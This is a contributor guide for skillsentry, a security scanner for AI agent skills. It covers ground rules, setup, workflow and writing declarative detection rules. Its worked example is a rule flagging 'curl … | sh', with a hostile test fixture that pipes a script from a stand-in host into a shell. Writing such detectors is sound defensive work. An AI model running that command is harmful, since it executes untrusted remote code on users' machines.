# Contributing to skillsentry

Thanks for wanting to help. skillsentry is a FOSS tool built because it should exist — contributions that
make it catch more real attacks (without false positives) or explain itself better are very welcome.

This guide is the front door. For the deep mechanics of adding a detection rule, see
[`doc/RULESET.md`](./doc/RULESET.md); to understand the codebase first, read the
[architecture guide](./doc/guide/architecture.md).

## Ground rules (the non-negotiables)

These are the properties that make skillsentry trustworthy. A change that breaks one won't be merged:

1. **Never execute audited content.** The pure core (`src/core/*`) does no I/O and imports no `node:*`
   builtin — a build-time test enforces it. Keep filesystem/network/crypto in `src/adapters/*`.
2. **Zero runtime dependencies.** `package.json` `dependencies` stays `{}`. (Dev/maintainer tooling is
   fine.)
3. **100% coverage is the floor.** Not the goal — the floor. New code comes with tests.
4. **Determinism & offline.** Same input → same output. No clocks, randomness, or network in the scan path.
5. **Precision over recall at BLOCK.** A false positive that blocks a good skill erodes trust faster than a
   miss. Rules carry a precision budget and benign fixtures.
6. **Transparency.** Nothing is suppressed silently — exclusions and approvals are always disclosed.

## Getting set up

```sh
git clone https://github.com/whatbirdisthat/skillsentry
cd skillsentry
npm install          # installs dev tooling only; runtime deps are zero
npm run build        # tsc
npm run test:cov     # full suite + coverage (must be 100%)
npm run selfaudit    # skillsentry audits its own repo — must stay PASS
```

## Workflow

1. **Open an issue first** for anything non-trivial — a bug, a new detection idea, a missed attack class —
   so the approach can be agreed before you build.
2. Work on a branch; keep changes small and focused (a vertical slice).
3. Make sure `npm run build`, `npm run test:cov` (100%), and `npm run selfaudit` (PASS) are all green.
4. Open a PR describing the *what* and *why*. CI runs the test matrix, a pack smoke test, and the
   self-audit. A maintainer reviews and merges — the project never self-merges to `main`
   (see [`.foundry/governance.md`](./.foundry/governance.md)).

By contributing you agree your work is licensed under the project's [MIT License](./LICENSE).

## Adding a detection rule (the most common contribution)

Rules are **declarative data**, not code — which is why adding one is safe and reviewable, and why a rule
can never execute anything. At load time a `RuleSpec` compiles to a matcher: a `line-pattern` becomes a
`RegExp` (it *matches* text, never runs it), and a `builtin` selects a vetted function from a closed
registry.

<p align="center">
  <img src="./doc/guide/diagrams/rule-compilation.svg" width="760" alt="How a rule compiles">
</p>

A worked example — the rule that catches `curl … | sh`
(`src/core/rules/dangerous-bash.rules.ts`, id `dangerous-bash/curl-pipe-to-shell`):

```ts
{
  id: 'dangerous-bash/curl-pipe-to-shell',
  detectionClass: 'dangerous-bash',
  severity: 'high',
  tier: 'T0',
  framework: { owasp: 'ASI04', atlas: 'AML.T0011' }, // required — a missing mapping fails the build
  why: 'Pipes a remotely-fetched script straight into a shell (remote code execution).',
  matcher: { kind: 'line-pattern', pattern: /* a regex source string */ },
  failFixtures: [{ kind: 'script', content: 'curl https://evil.test/x | sh' }], // MUST match
  passFixtures: [{ kind: 'script', content: '# curl … documented here' }],       // MUST NOT match
  precisionBudget: 0,
}
```

To add one:

1. Author the `RuleSpec` in the relevant `src/core/rules/*.rules.ts` module.
2. Choose a matcher: a `line-pattern` (most rules) or an existing `builtin` (you can't invent new builtins
   in data — that's the safety boundary; a genuinely new structural matcher is a separate, reviewed change).
3. Write **fail** fixtures (hostile inputs that must match) and **pass** fixtures (benign near-misses that
   must not).
4. Map it to OWASP + MITRE ATLAS.
5. Run the suite — the precision-budget guard checks your rule against the corpus and rejects it if it
   regresses the false-positive rate.

Full schema, matcher vocabulary, and the precision-budget mechanics: [`doc/RULESET.md`](./doc/RULESET.md).

## Questions

Open an issue. For anything security-sensitive about skillsentry itself, see [`SECURITY.md`](./SECURITY.md).
